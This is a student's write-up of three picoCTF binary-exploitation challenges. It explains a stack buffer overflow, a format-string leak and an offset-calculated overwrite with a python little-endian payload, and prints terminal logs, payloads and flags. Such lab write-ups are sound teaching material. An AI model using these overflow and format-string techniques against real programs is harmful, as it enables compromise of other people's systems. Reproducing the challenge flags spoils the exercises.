# Binary Exploitation

# 1. buffer overflow 0
> Description: Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 56132
## Solution:
When we analyze the source code, we figure out that our standard input is being stored in "buf1". In the main function, "vuln()" function is being called with "buf1" as argument. The vuln() function copies the argument into "buf2". The maximum size of buf2 is 16. Since, input > buf1 > buf2, if our input is longer than 16 characters, it will overflow buf2 and overwrite the element above it. This overwriting of the element triggers the function to give us the flag.
```
root@DESKTOP-9PHI4CM:~# nc saturn.picoctf.net 64880
Input: aaaaaaaaaaaaaaaaflag
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```
## Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```
## Concepts learnt:
I learnt about stack buffer overflow: If we exceed the maximum size of a buffer while it stores input, we can overwrite whatever is above it. We can exploit this vulnerability in order to print our desired output.
## Resources:
https://ctf101.org/binary-exploitation/buffer-overflow/

***

# 2. format string 0
> Description: Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 61602
## Solution:
According to the source code, The function serve_patrick() will lead us to function serve_bob() only if the input is greater than 64 (BUFSIZE=32).
We check the first option "Breakf@st_Burger", which turns out to be too small in value. We then check "Gr%114d_Cheese", this works as it contains a format specifier: %114d. This fills our input with 114 garbage values and our input becomes large enough in size. We then go to function serve_bob().
We know that if there are more format specifiers than there are function arguments to fill its place, printf() will just print the next value on the stack (for whichever format specifier's argument is not given). 
So we first check Pe%to_Portobello but we dont get any result i=with it. Following the hint, we then check Cla%sic_Che%s%steak as it has 3 format specifiers.
This works because there are no arguments with the format specifiers, so printf keeps accessing the values at the location next on the stack. This may cause the program to crash (as bob wants an order that would break the shop) and we get the flag.
```
root@DESKTOP-9PHI4CM:~# nc mimas.picoctf.net 61602
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Breakf@st_Burger
Breakf@st_BurgerPatrick is still hungry!
Try to serve him something of larger size!
^C
root@DESKTOP-9PHI4CM:~# nc mimas.picoctf.net 61602
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Pe%to_Portobello
Pe20021560_Portobello
root@DESKTOP-9PHI4CM:~# nc mimas.picoctf.net 61602
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```
## Flag:
```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```
## Concepts learnt:
I learnt that we can manipulate the source code into giving our desired output by formatting the input strings in different ways using different format specifiers.
I also learnt that if there are more format specifiers than there are function arguments to fill its place, printf() will just print the next value on the stack (for whichever format specifier's argument is not given).
## Resources:
https://medium.com/swlh/binary-exploitation-format-string-vulnerabilities-70edd501c5be

https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/

***

# 3. clutter overflow
> Description: Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890
## Solution:
We first analyze the source code and find out that the flag will be printed only if its value is equal to GOAL (0xdeadbeef). We achieve this be buffer overflow.
So "clutter" stores our standard input. When we view the assembly code after disassembling the source code, we see that even though max size of clutter is 256 (0x100), we need to input 8 more character to reach the overflow point. Start point of clutter is 280 and of code is 16 (after converting their size in hex to decimal). So our input needs to be more than 264 (16+264=280) characters as the 265th character will start overwriting code.

<img width="1920" height="917" alt="image" src="https://github.com/user-attachments/assets/85c4b2e3-6595-4ffe-84cb-6fe6ad9fe5a0" />

So the input string should contain anything for the first 264 characters and then contain the value of GOAL: 0xdeadbeef to overwrite code completely and get the flag. 0xdeadbeef must be written in 64 bit little endian form (as we can see that "code" has to have 8 bytes in disassembled code). To do this we execute a simple python command which forms this string and pipes it into our program: 

python3 -c "import sys; sys.stdout.buffer.write(b'A'*264 + b'\xef\xbe\xad\xde\x00\x00\x00\x00\n')" | nc mars.picoctf.net 31890

```
root@DESKTOP-9PHI4CM:~# python3 -c "import sys; sys.stdout.buffer.write(b'A'*264 + b'\xef\xbe\xad\xde\x00\x00\x00\x00\n')" | nc mars.picoctf.net 31890
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Flag:
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
## Concepts Learnt:
The same as the previous challenges, about stack, buffer overflow. I also learnt how to write something in little endian format. I learnt how to find out the overflow point by calculating the distance between clutter and code by seeing the disassembled code.
## Resources:
https://ctf101.org/binary-exploitation/buffer-overflow/

https://www.reddit.com/r/ExploitDev/comments/ffuvg6/calculating_the_offset/


